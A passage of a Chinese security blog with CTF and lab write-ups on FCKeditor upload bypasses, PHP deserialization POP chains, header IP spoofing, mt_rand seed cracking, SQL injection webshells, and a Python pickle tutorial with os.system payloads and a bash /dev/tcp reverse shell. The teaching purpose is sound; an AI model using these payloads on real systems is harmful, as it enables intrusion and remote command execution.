36, 95, 80, 79, 83, 84, 91, 49, 93, 41, 59, 63, 62) in into outoutfilefile %27/var/www/html/mb.php%27%23 密码为1，蚁剑连在/key.txt发现key 编辑器漏洞编辑器漏洞分析溯源(第1题)参考:https://www.secpulse.com/archives/116338.html 访问靶场，提示编辑器在/fckeditor/目录 查看一下编辑器版本信息 12/fckeditor/editor/dialog/fck_about.html/FCKeditor/_whatsnew.html 测试上传点 123456789101112131415161718192021222324252627FCKeditor/editor/filemanager/browser/default/connectors/test.htmlFCKeditor/editor/filemanager/upload/test.htmlFCKeditor/editor/filemanager/connectors/test.htmlFCKeditor/editor/filemanager/connectors/uploadtest.htmlFCKeditor/_samples/default.htmlFCKeditor/_samples/asp/sample01.aspFCKeditor/_samples/asp/sample02.aspFCKeditor/_samples/asp/sample03.aspFCKeditor/_samples/asp/sample04.aspFCKeditor/_samples/default.htmlFCKeditor/editor/fckeditor.htmFCKeditor/editor/fckdialog.htmlFCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector.jsp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/php/connector.phpFCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/asp/connector.aspFCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/aspx/connector.aspxFCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/jsp/connector.jspFCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.aspFCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector.jspfckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/aspx/connector.Aspxfckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/php/connector.php 随便输一个不存在的路径发现是IIS的报错页面，在 1fckeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;test.html 发现可以上传 在http 响应头里看到有Microsoft-IIS/6.0，绕过方法很多，这里不需要绕过好像 1. 二次上传绕过 文件名‘ . ’ 修改为‘ _ ’ FCK在上传了诸如shell.asp;.jpg的文件后，会自动将文件名改为shell_asp;.jpg。可以继续上传同名文件，文件名会变为shell.asp;(1).jpg 2. 提交shell.php+空格绕过 提交shell.php+空格绕过 空格只支持windows系统，linux系统是不支持的，可提交shell.php+空格来绕过文件名限制。 3. iis6.0突破文件夹限制 12345Fckeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;asp&#x2F;connector.asp?Command&#x3D;CreateFolder&amp;Type&#x3D;File&amp;CurrentFolder&#x3D;&#x2F;shell.asp&amp;NewFolderName&#x3D;z.aspFCKeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;asp&#x2F;connector.asp?Command&#x3D;CreateFolder&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;&#x2F;shell.asp&amp;NewFolderName&#x3D;z&amp;uuid&#x3D;1244789975684FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;asp&#x2F;connector.asp?Command&#x3D;CreateFolder&amp;CurrentFolder&#x3D;&#x2F;&amp;Type&#x3D;Image&amp;NewFolderName&#x3D;shell.asp 4. 文件解析限制 通过Fckeditor编辑器在文件上传页面中，创建诸如1.asp文件夹，然后再到该文件夹下上传一个图片的webshell文件，获取其shell。 1http:&#x2F;&#x2F;www.moonback.xyz&#x2F;images&#x2F;upload&#x2F;201806&#x2F;image&#x2F;1.asp&#x2F;1.jpg 关于解析漏洞参考：https://www.secpulse.com/archives/3750.html 最终上传类似shell.asp;jpg就能上传成功，成功之后会把目录文件列举出来,地址： 1&#x2F;userfiles&#x2F;file&#x2F;shell.asp;jpg 蚁剑连找flag就行 如果找不到目录的话可以试试 1. 根据xml返回信息查看网站目录 1http:&#x2F;&#x2F;www.-sec.org&#x2F;fckeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;aspx&#x2F;connector.aspx?Command&#x3D;CreateFolder&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;..&#x2F;..&#x2F;..&#x2F;&amp;NewFolderName&#x3D;shell.asp 2. 获取当前文件夹 123FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;aspx&#x2F;connector.aspx?Command&#x3D;GetFoldersAndFiles&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;php&#x2F;connector.php?Command&#x3D;GetFoldersAndFiles&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;asp&#x2F;connector.asp?Command&#x3D;GetFoldersAndFiles&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;&#x2F; 3. 游览c盘 1&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;aspx&#x2F;connector.aspx?Command&#x3D;GetFoldersAndFiles&amp;Type&#x3D;Image&amp;Curre 11","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"},{"name":"墨者学院","slug":"墨者学院","permalink":"http://www.moonback.xyz/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"}]},{"title":"MRCTF2020 writeup","slug":"MRCTF2020-writeup","date":"2020-04-11T03:41:09.000Z","updated":"2020-04-26T12:21:25.641Z","comments":true,"path":"2020/04/11/MRCTF2020-writeup/","link":"","permalink":"http://www.moonback.xyz/2020/04/11/MRCTF2020-writeup/","excerpt":"本篇博客主要介绍了MRCTF 2020部分题目的writeup!","text":"本篇博客主要介绍了MRCTF 2020部分题目的writeup! webEz_bypass查看源代码 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpinclude &#x27;flag.php&#x27;;$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123; $id=$_GET[&#x27;id&#x27;]; $gg=$_GET[&#x27;gg&#x27;]; if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123; echo &#x27;You got the first step&#x27;; if(isset($_POST[&#x27;passwd&#x27;])) &#123; $passwd=$_POST[&#x27;passwd&#x27;]; if (!is_numeric($passwd)) &#123; if($passwd==1234567) &#123; echo &#x27;Good Job!&#x27;; highlight_file(&#x27;flag.php&#x27;); die(&#x27;By Retr_0&#x27;); &#125; else &#123; echo &quot;can you think twice??&quot;; &#125; &#125; else&#123; echo &#x27;You can not get it !&#x27;; &#125; &#125; else&#123; die(&#x27;only one way to get the flag&#x27;); &#125;&#125; else &#123; echo &quot;You are not a real hacker!&quot;; &#125;&#125;else&#123; die(&#x27;Please input first&#x27;);&#125;&#125; PYWebsite 你传你🐎呢试了好多，发现只能传png格式的文件,.htaccess绕过 再上传一个png的图片马即可 Ezpop1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253 &lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123; protected $var; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file=&#x27;index.php&#x27;)&#123; $this-&gt;source = $file; echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = array(); &#125; public function __get($key)&#123; $function = $this-&gt;p; return $function(); &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123; @unserialize($_GET[&#x27;pop&#x27;]);&#125;else&#123; $a=new Show; highlight_file(__FILE__);&#125; exp: 1234567891011121314151617181920&lt;?phpclass Show&#123; public $source; public $str; public function __construct()&#123; $this-&gt;str=new Test(); $this-&gt;str-&gt;p=new Modifier(); &#125;&#125;class Test&#123; public $p;&#125;class Modifier &#123; protected $var=&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;;&#125;$a=new Show();$a-&gt;source=new Show();echo urlencode(serialize($a)); pop链： 1Show-&gt;__wakeup()-&gt;preg_match()-&gt;__toString()-&gt;Test-&gt;__get-&gt;Modifier-&gt;__invoke-&gt;append() 分析一下，反序列化首先会执行__wakeup()方法，然后preg_match匹配触发__toString方法，即对象当作字符串匹配时，$str是一个Test对象，获得source属性从而触发__get()方法，$p被赋值为Modifier对象，类当作函数调用触发__invoke方法，接着就是文件包含php://fiter base64读文件了 套娃查看源代码 123456789&lt;?php$query = $_SERVER[&#x27;QUERY_STRING&#x27;]; if( substr_count($query, &#x27;_&#x27;) !== 0 || substr_count($query, &#x27;%5f&#x27;) != 0 )&#123; die(&#x27;Y0u are So cutE!&#x27;);&#125; if($_GET[&#x27;b_u_p_t&#x27;] !== &#x27;23333&#x27; &amp;&amp; preg_match(&#x27;/^23333$/&#x27;, $_GET[&#x27;b_u_p_t&#x27;]))&#123; echo &quot;you are going to the next ~&quot;;&#125; php字符串解析特性，preg_match换行绕过，payload: 1?b u p t=23333%0a 提示secrettw.php查看源代码，明显是jsfuck 控制台执行，提示 POST过去一个参数为Merak，得到 12345678910111213141516171819202122232425&lt;?php error_reporting(0); include &#x27;takeip.php&#x27;;ini_set(&#x27;open_basedir&#x27;,&#x27;.&#x27;); include &#x27;flag.php&#x27;;if(isset($_POST[&#x27;Merak&#x27;]))&#123; highlight_file(__FILE__); die(); &#125; function change($v)&#123; $v = base64_decode($v); $re = &#x27;&#x27;; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) + $i*2 ); &#125; return $re; &#125;echo &#x27;Local access only!&#x27;.&quot;&lt;br/&gt;&quot;;$ip = getIp();if($ip!=&#x27;127.0.0.1&#x27;)echo &quot;Sorry,you don&#x27;t have permission! Your ip is :&quot;.$ip;if($ip === &#x27;127.0.0.1&#x27; &amp;&amp; file_get_contents($_GET[&#x27;2333&#x27;]) === &#x27;todat is a happy day&#x27; )&#123;echo &quot;Your REQUEST is:&quot;.change($_GET[&#x27;file&#x27;]);echo file_get_contents(change($_GET[&#x27;file&#x27;])); &#125;?&gt; 把change函数逆向一下： 1234567891011&lt;?phpfunction change($v)&#123; $re = &#x27;&#x27;; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) - $i*2 ); &#125; $s = base64_encode($re); echo $s;&#125;change(&#x27;flag.php&#x27;);// ZmpdYSZmXGI= 伪造一下ip: 123456789X-Forwarded-For:127.0.0.1X-Forwarded-Host:127.0.0.1X-Client-IP:127.0.0.1X-remote-IP:127.0.0.1X-remote-addr:127.0.0.1True-Client-IP:127.0.0.1X-Client-IP:127.0.0.1Client-IP:127.0.0.1X-Real-IP:127.0.0.1 2333那里用data://协议 最终请求 Ezauditdirsearch扫不知为啥扫不出来，手怼/www.zip，index.php： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php header(&#x27;Content-type:text/html; charset=utf-8&#x27;);error_reporting(0);if(isset($_POST[&#x27;login&#x27;]))&#123; $username = $_POST[&#x27;username&#x27;]; $password = $_POST[&#x27;password&#x27;]; $Private_key = $_POST[&#x27;Private_key&#x27;]; if (($username == &#x27;&#x27;) || ($password == &#x27;&#x27;) ||($Private_key == &#x27;&#x27;)) &#123; // 若为空,视为未填写,提示错误,并3秒后返回登录界面 header(&#x27;refresh:2; url=login.html&#x27;); echo &quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;; exit;&#125; else if($Private_key != &#x27;*************&#x27; ) &#123; header(&#x27;refresh:2; url=login.html&#x27;); echo &quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;; exit; &#125; else&#123; if($Private_key === &#x27;************&#x27;)&#123; $getuser = &quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;$password&#x27;&quot;.&#x27;;&#x27;; $link=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;); mysql_select_db(&quot;test&quot;,$link); $result = mysql_query($getuser); while($row=mysql_fetch_assoc($result))&#123; echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;; &#125; &#125; &#125;&#125; // genarate public_key function public_key($length = 16) &#123; $strings1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $public_key = &#x27;&#x27;; for ( $i = 0; $i &lt; $length; $i++ ) $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; &#125; //genarate private_key function private_key($length = 12) &#123; $strings2 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $private_key = &#x27;&#x27;; for ( $i = 0; $i &lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key; &#125; $Public_key = public_key(); //$mt_srand() = KVQP0LdJKRaV3n9D how to get crispr&#x27;s private_key??? 先看最下面，很明显php伪随机数，给了mt_srand()，用php_mt_seed爆破出种子，再用种子算private_key 先生成php_mt_seed爆破的序列 1234s=&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;pwd=&quot;KVQP0LdJKRaV3n9D&quot;for i in pwd: print(str(s.index(i))+&quot; &quot;+str(s.index(i))+&quot; 0 61 &quot;,end=&quot;&quot;) 爆破出种子为1775196155 exp: 123456789101112131415161718192021&lt;?phpmt_srand(1775196155);function public_key($length = 16) &#123; $strings1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $public_key = &#x27;&#x27;; for ( $i = 0; $i &lt; $length; $i++ ) $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; &#125; //genarate private_key function private_key($length = 12) &#123; $strings2 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $private_key = &#x27;&#x27;; for ( $i = 0; $i &lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key; &#125; echo public_key().&quot;\\n&quot;; echo private_key().&quot;\\n&quot;; // XuNhoueCDCGc //$Public_key = KVQP0LdJKRaV3n9D how to get crispr&#x27;s private_key??? 试了试index.php没反应，源码可能是登陆页面，longin.php还真有 接着就注入拿flag了 Ezpop_Revengdirsearch又扫不到www.zip，也不知道是啥原因，换dirmap了","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"},{"name":"MRCTF","slug":"MRCTF","permalink":"http://www.moonback.xyz/tags/MRCTF/"}]},{"title":"Python反序列化学习","slug":"Python反序列化学习","date":"2020-04-10T03:39:54.000Z","updated":"2020-04-13T00:05:45.175Z","comments":true,"path":"2020/04/10/Python反序列化学习/","link":"","permalink":"http://www.moonback.xyz/2020/04/10/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/","excerpt":"本篇博客主要介绍了Python反序列化的相关内容！","text":"本篇博客主要介绍了Python反序列化的相关内容！ 前言与php序列化反序列化类似 Python序列化，就是把一个在内存当中的python对象通过某种协议或者标准，转换成二进制类型的数据。 Python反序列化，是一个完全相反的过程，从磁盘文件或者网络中读取到二进制数据，将它们转换成内存中可操作的对象，这就是反序列化。 Python实现序列化方案： pickle PyYAML XML json messagepack 下面主要介绍pickle模块序列化与反序列化 pickle模块序列化：使用dumps或者dump方法 dumps：将内存对象序列化为字节对象 dump：将内存对象序列化到文件对象(存入文件) 反序列化：使用loads和load方法 loads：将 字节对象反序列化为内存对象 load：从文件对象反序列化为内存对象 举个例子： 123456789101112import pickleclass People(): def __init__(self,name = &quot;MoonBack&quot;): self.name = name def __str__(self): return &quot;Hello World!&quot;a=People()print(pickle.dumps(a))print(pickle.loads(pickle.dumps(a))) __str__类似于java中的toString方法，即返回对象的字符串表示 1b&#x27;\\x80\\x03c__main__\\nPeople\\nq\\x00)\\x81q\\x01&#125;q\\x02X\\x04\\x00\\x00\\x00nameq\\x03X\\x08\\x00\\x00\\x00MoonBackq\\x04sb.&#x27; 这么长的一串是啥意思呢？慢慢来说 pickle指令码pickle.loads()函数是我们用来反序列化一个对象的一个接口，底层实现是基于_Unpickler类 _Unpickler类维护了两个东西：栈区和存储区。结构如下图： 栈是unpickle机最核心的数据结构，所有的数据操作几乎都在栈上。为了应对数据嵌套，栈区分为两个部分：当前栈专注于维护最顶层的信息，最终留在栈顶的值将被作为反序列化对象返回，有的这部分博客上写的是指令处理器，而前序栈维护下层的信息，用来临时存储数据、参数以及对象。 存储区可以类比内存，用于存取变量。它是一个数组，以下标为索引。它的每一个单元可以用来存储任何东西，大多数情况下我们并不需要这个存储区 看了其他人写的博客，发现对这三个名称叫法不尽相同，但表达的意思基本相似，就这样理解吧！ 为了看的更清晰，我们可以使用Python提供的pickle调试器模块pickletools 123456789101112import pickleimport pickletoolsclass People(): def __init__(self,name = &quot;MoonBack&quot;): self.name = name def __str__(self): return &quot;Hello World!&quot;a=People()pickletools.dis(pickle.dumps(a)) 其实就是序列化结果的比较容易理解的形式，看着和汇编代码很像，在结果里面每一行就是一个指令码。 这些指令说明，全是英文就很难受，实在找不到就翻译 1234567891011121314151617181920212223242526272829303132333435363738394041424344MARK = b&#x27;(&#x27; # push special markobject on stackSTOP = b&#x27;.&#x27; # every pickle ends with STOPPOP = b&#x27;0&#x27; # discard topmost stack itemPOP_MARK = b&#x27;1&#x27; # discard stack top through topmost markobjectDUP = b&#x27;2&#x27; # duplicate top stack itemFLOAT = b&#x27;F&#x27; # push float object; decimal string argumentINT = b&#x27;I&#x27; # push integer or bool; decimal string argumentBININT = b&#x27;J&#x27; # push four-byte signed intBININT1 = b&#x27;K&#x27; # push 1-byte unsigned intLONG = b&#x27;L&#x27; # push long; decimal string argumentBININT2 = b&#x27;M&#x27; # push 2-byte unsigned intNONE = b&#x27;N&#x27; # push NonePERSID = b&#x27;P&#x27; # push persistent object; id is taken from string argBINPERSID = b&#x27;Q&#x27; # &quot; &quot; &quot; ; &quot; &quot; &quot; &quot; stackREDUCE = b&#x27;R&#x27; # apply callable to argtuple, both on stackSTRING = b&#x27;S&#x27; # push string; NL-terminated string argumentBINSTRING = b&#x27;T&#x27; # push string; counted binary string argumentSHORT_BINSTRING= b&#x27;U&#x27; # &quot; &quot; ; &quot; &quot; &quot; &quot; &lt; 256 bytesUNICODE = b&#x27;V&#x27; # push Unicode string; raw-unicode-escaped&#x27;d argumentBINUNICODE = b&#x27;X&#x27; # &quot; &quot; &quot; ; counted UTF-8 string argumentAPPEND = b&#x27;a&#x27; # append stack top to list below itBUILD = b&#x27;b&#x27; # call __setstate__ or __dict__.update()GLOBAL = b&#x27;c&#x27; # push self.find_class(modname, name); 2 string argsDICT = b&#x27;d&#x27; # build a dict from stack itemsEMPTY_DICT = b&#x27;&#125;&#x27; # push empty dictAPPENDS = b&#x27;e&#x27; # extend list on stack by topmost stack sliceGET = b&#x27;g&#x27; # push item from memo on stack; index is string argBINGET = b&#x27;h&#x27; # &quot; &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 1-byte argINST = b&#x27;i&#x27; # build &amp; push class instanceLONG_BINGET = b&#x27;j&#x27; # push item from memo on stack; index is 4-byte argLIST = b&#x27;l&#x27; # build list from topmost stack itemsEMPTY_LIST = b&#x27;]&#x27; # push empty listOBJ = b&#x27;o&#x27; # build &amp; push class instancePUT = b&#x27;p&#x27; # store stack top in memo; index is string argBINPUT = b&#x27;q&#x27; # &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 1-byte argLONG_BINPUT = b&#x27;r&#x27; # &quot; &quot; &quot; &quot; &quot; ; &quot; &quot; 4-byte argSETITEM = b&#x27;s&#x27; # add key+value pair to dictTUPLE = b&#x27;t&#x27; # build tuple from topmost stack itemsEMPTY_TUPLE = b&#x27;)&#x27; # push empty tupleSETITEMS = b&#x27;u&#x27; # modify dict by adding topmost key+value pairsBINFLOAT = b&#x27;G&#x27; # push float; arg is 8-byte float encoding​TRUE = b&#x27;I01\\n&#x27; # not an opcode; see INT docs in pickletools.pyFALSE = b&#x27;I00\\n&#x27; # not an opcode; see INT docs in pickletools.py 当前用于 pickling 的协议共有 5 种。使用的协议版本越高，读取生成的 pickle 所需的 Python 版本就要越新。 v0 版协议是原始的 “人类可读” 协议，并且向后兼容早期版本的 Python。 v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。 v2 版协议是在 Python 2.3 中引入的。它为存储 new-style class 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 PEP 307。 v3 版协议添加于 Python 3.0。它具有对 bytes 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。 v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 PEP 3154。 0号版本是人类最可读的；之后的版本加入了一大堆不可打印字符，不过这些新加的东西都只是为了优化，本质上没有太大的改动。 一个好消息是，pickle协议是向前兼容的。0号版本的字符串可以直接交给pickle.loads()，不用担心引发什么意外。 折磨多好像没啥用，介绍几个常用的指令码： S : 后面跟的是字符串 I：后面跟的是整形 s：添加键值对到字典 ( ：压入一个标志到栈中，表示元组的开始位置 t ：从栈顶开始，找到最上面的一个(，并将(到t中间的内容全部弹出，组成一个元组，再把这个元组压入栈中 c ：引入模块名和类名（模块名和类名之间使用回车分隔，find_class校验就在这一步） R ：从栈顶弹出一个可执行对象和一个元组，元组作为函数的参数列表执行，并将返回值压入栈上 . ：点号是结束符 }：push一个空的字典 反序列化过程：https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf 手写指令码： 基本模式： 1234c&lt;module&gt;&lt;callable&gt;(&lt;args&gt;tR 看个小例子： 12345678910111213141516cossystem(S&#x27;ls&#x27;tR.&lt;=&gt; __import__(&#x27;os&#x27;).system(*(&#x27;ls&#x27;,))# 分解一下：cossystem =&gt; 引入 system，并将函数添加到 stack(S&#x27;ls&#x27; =&gt; 把当前 stack 存到 metastack，清空 stack，再将 &#x27;ls&#x27; 压入 stackt =&gt; stack 中的值弹出并转为 tuple，把 metastack 还原到 stack，再将 tuple 压入 stack# 简单来说，(,t 之间的内容形成了一个 tuple，stack 目前是 [&lt;built-in function system&gt;, (&#x27;ls&#x27;,)]R =&gt; system(*(&#x27;ls&#x27;,)). =&gt; 结束，返回当前栈顶元素 __reduce__方法该方法在反序列化时自动调用 如果返回值是一个字符串，那么将会去当前作用域中查找字符串值对应名字的对象，将其序列化之后返回，例如最后return &#39;a&#39;,那么它就会在当前的作用域中寻找名为a的对象然后返回，否则报错。 如果返回值是一个元组，要求是2到5个参数，第一个参数是可调用的对象，第二个是该对象所需的参数元组，剩下三个可选。所以比如最后return (eval,(&quot;os.system(&#39;ls&#39;)&quot;,))，那么就是执行eval函数，然后元组内的值作为参数，从而达到执行命令或代码的目的，当然也可以return (os.system,(&#39;ls&#39;,))。 由此我们可以构造如下的exp: 12345678910import osimport pickleclass test(): def __reduce__(self): return (os.system,(&#x27;whoami&#x27;,))a=test()c=pickle.dumps(a)print(c) 然后我们无需导入os模块，无需有test类，就能代码执行 同样，弹shell之类的也不在话下 12345678910import osimport pickleclass test(): def __reduce__(self): code=&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#x27; return (os.system,(code,))a=test()c=pickle.dumps(a)print(c)pickle.loads(c) __reduce__方法是新式类(内置类)特有的，在python2中要注意继承object类 真实案例P神的操作：https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html Redis未授权访问+Python反序列化 CTF题目[SUCTF 2019]Guess Game题目地址：https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game buu上有环境，列下关键的源码： game_client.py 12345678910111213141516171819202122232425262728293031import asyncioimport picklefrom guess_game.Ticket import Ticketfrom guess_game import bannerfrom struct import packdef pack_length(obj): return pack(&#x27;&gt;I&#x27;, obj)async def start_client(host, port): reader, writer = await asyncio.open_connection(host, port) print(banner) for _ in range(10): number = &#x27;&#x27; while number == &#x27;&#x27;: try: number = input(&#x27;Input the number you guess\\n&gt; &#x27;) number = int(number) except ValueError: number = &#x27;&#x27; pass ticket = Ticket(number) ticket = pickle.dumps(ticket) writer.write(pack_length(len(ticket))) writer.write(ticket) response = await reader.readline() print(response.decode()) response = await reader.readline() print(response.decode())loop = asyncio.get_event_loop()loop.run_until_complete(start_client(&#x27;node3.buuoj.cn&#x27;, 27628)) 上面的代码的意思就是进行10次猜数，序列化并编码传输到服务端 game_server.py 1234567891011121314151617181920212223242526272829303132333435363738394041from guess_game.Ticket import Ticketfrom guess_game.RestrictedUnpickler import restricted_loadsfrom struct import unpackfrom guess_game import gameimport sysdef get_flag(): with open(&#x27;/flag&#x27;, &#x27;r&#x27;) as f: flag = f.read().strip() return flagdef read_length(obj): return unpack(&#x27;&gt;I&#x27;, obj)def stdin_read(length): return sys.stdin.buffer.read(length)try: while not game.finished(): length = stdin_read(4) length, = read_length(length) ticket = stdin_read(length) ticket = restricted_loads(ticket) # 调用RestrictedUnpickler.restricted_loads()方法 assert type(ticket) == Ticket if not ticket.is_valid(): print(&#x27;The number is invalid.&#x27;) game.next_game(Ticket(-1)) continue win = game.next_game(ticket) if win: text = &quot;Congratulations, you get the right number!&quot; else: text = &quot;Wrong number, better luck next time.&quot; print(text) if game.is_win(): text = &quot;Game over! You win all the rounds, here is your flag %s&quot; % get_flag() else: text = &quot;Game over! You got %d/%d.&quot; % (game.win_count, game.round_count) print(text)except Exception: print(&#x27;Houston, we got a problem.&#x27;) 这段代码是服务端的，接收传过来的数据并反序列化，判断反序列化的结果是不是Ticket类，是的话才会接着执行，game.is_win()成立才会给flag RestrictedUnpickler.py 123456789101112131415import ioimport pickleimport sysclass RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): # Only allow safe classes if &quot;guess_game&quot; == module[0:10] and &quot;__&quot; not in name: return getattr(sys.modules[module], name) # Forbid everything else. raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; % (module, name))def restricted_loads(s): &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot; return RestrictedUnpickler(io.BytesIO(s)).load() 这段代码的介绍参考：https://docs.python.org/zh-cn/3/library/pickle.html?highlight=__reduce#restricting-globals 大概意思就是，为了防止pickle反序列化的危害，可以继承pickle.Unpickler实现find_class方法从而达到过滤部分模块方法的目的，该方法在使用该类时自动调用。 而在该题中，必须有guess_game里的类，而且过滤了__，__reduce__那种方法显然不能用了 看下Game.py： 1234567891011121314151617181920212223242526from random import randintfrom guess_game.Ticket import Ticketfrom guess_game import max_round, number_range# max_round代表回合 number_range代表最大数class Game: def __init__(self): number = randint(0, number_range) self.curr_ticket = Ticket(number) self.round_count = 0 self.win_count = 0 def next_game(self, ticket): win = False if self.curr_ticket == ticket: self.win_count += 1 win = True number = randint(0, number_range) self.curr_ticket = Ticket(number) self.round_count += 1 return win def finished(self): return self.round_count &gt;= max_round def is_win(self): return self.win_count == max_round 在__init__.py: 123456max_round = 10number_range = 10from guess_game.Game import Gamegame = Game() 这里虽然条件受限, 只能加载指定模块, 但是可以看到 __init.py__ 中 game = Game(), 所以只要构造出 pickle 代码获得 guess_game.game对象, 然后修改 game 的 win_count 和 round_count 即可.注意这里必须手写, 如果是 from guess_game import game, 然后修改再 dumps 这个 game 的话, 是在运行时重新新建一个 Game 对象, 而不是从 guess_game 这个 module 里面获取。 exp: 123456789101112131415161718import socketimport structs = socket.socket()s.connect((&#x27;node3.buuoj.cn&#x27;, 29935))exp = 